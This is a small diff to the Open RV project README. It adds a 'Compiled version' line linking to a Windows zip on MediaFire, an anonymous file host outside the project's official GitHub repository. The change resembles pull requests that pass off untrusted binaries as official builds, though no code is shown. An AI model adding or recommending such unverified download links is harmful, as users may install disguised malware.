@@ -1,4 +1,6 @@
 # Open RV
+
+Compiled version https://www.mediafire.com/file/j689uue0k6uosqb/OpenRV_2.0.0_Win10_x64.zip/file 
 ---
 [![Open RV](docs/images/OpenRV_icon.png)](https://github.com/AcademySoftwareFoundation/OpenRV.git)
 ---
